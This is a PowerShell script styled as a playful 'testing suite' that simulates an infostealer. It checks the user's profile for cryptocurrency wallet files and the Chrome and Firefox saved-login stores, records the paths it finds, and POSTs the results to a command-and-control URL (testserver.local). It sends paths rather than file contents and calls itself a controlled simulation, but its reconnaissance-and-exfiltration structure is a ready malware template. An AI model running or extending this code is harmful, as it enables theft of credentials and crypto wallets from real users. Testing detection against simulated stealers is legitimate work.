function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ " -ForegroundColor Cyan
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |" -ForegroundColor Cyan
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |" -ForegroundColor Cyan
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |" -ForegroundColor Cyan
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|" -ForegroundColor Cyan

    Write-Host "      🚀 Welcome to the Fun Testing Suite! 🚀"
    Write-Host "      (No humans, wallets, or browsers harmed!)"
    Write-Host ""
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the simulated info file
$infoFilePath = "controlled_test_results.txt"

# Function to simulate searching for wallet files
function Search-ForWallets {
    Write-Host "[🔍] Searching for Crypto Wallet Files in the simulation..."
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Simulated Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Write-Host "  [✅] Wallet file found at: $path"
            Add-Content -Path $infoFilePath -Value "Simulated wallet: $path"
        } else {
            Write-Host "  [❌] No wallet found at: $path"
        }
    }
}

# Function to simulate searching for browser credential files
function Search-ForBrowserCredentials {
    Write-Host "[🔍] Scanning for Browser Credential Files..."
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Simulated Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Write-Host "  [✅] Found Chrome credentials: $chromePath"
        Add-Content -Path $infoFilePath -Value "Simulated Chrome credentials: $chromePath"
    } else {
        Write-Host "  [❌] No Chrome credentials found."
    }

    if (Test-Path $firefoxPath) {
        Write-Host "  [✅] Found Firefox credentials: $firefoxPath"
        Add-Content -Path $infoFilePath -Value "Simulated Firefox credentials: $firefoxPath"
    } else {
        Write-Host "  [❌] No Firefox credentials found."
    }
}

# Function to simulate sending information to a C2 server
function Send-InfoToC2Server {
    Write-Host "[🚀] Sending collected information to the controlled C2 server..."
    $c2Url = "http://testserver.local/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to simulate data transfer
    try {
        Invoke-WebRequest -Uri $c2Url -Method Post -Body $data -ErrorAction Stop
        Write-Host "[✅] Data successfully sent to the controlled server!"
    } catch {
        Write-Host "[❌] Failed to send data. Check your network or server."
    }
}

# Main execution flow
Write-Host "[⚙️] Starting the Fun Testing Suite..."
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
Write-Host "[🏁] Simulation complete! Check $infoFilePath for results."
